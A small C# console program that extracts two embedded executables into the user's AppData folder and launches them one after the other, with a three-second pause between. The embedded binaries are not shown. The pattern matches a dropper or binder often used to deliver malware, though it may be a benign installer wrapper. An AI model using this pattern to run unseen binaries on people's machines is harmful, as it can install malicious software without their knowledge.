using System;
using System.Diagnostics;
using System.IO;
using System.Threading;


namespace ConsoleApp1
{
    internal class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string firstFile = Path.Combine(directory, "one.exe");  // Ensure file extensions are correct
                string secondFile = Path.Combine(directory, "install1.exe");  // Ensure file extensions are correct

                // Debugging output
                Console.WriteLine($"Extracting to: {firstFile}");
                Console.WriteLine($"Extracting to: {secondFile}");

                // Extract the files from resources
                File.WriteAllBytes(firstFile, Properties.Resources.one);
                File.WriteAllBytes(secondFile, Properties.Resources.install1);

                // Check if files exist
                if (File.Exists(firstFile))
                {
                    Console.WriteLine("First file extracted successfully.");
                }
                else
                {
                    Console.WriteLine("Failed to extract the first file.");
                }

                if (File.Exists(secondFile))
                {
                    Console.WriteLine("Second file extracted successfully.");
                }
                else
                {
                    Console.WriteLine("Failed to extract the second file.");
                }

                // Start the first file
                Process.Start(firstFile);

                // Wait for 3 seconds
                Thread.Sleep(3000);

                // Start the second file
                Process.Start(secondFile);
            }
            catch (Exception ex)
            {
                // Log or handle the exception
                Console.WriteLine($"An error occurred: {ex.Message}");
            }
        }
    }
}
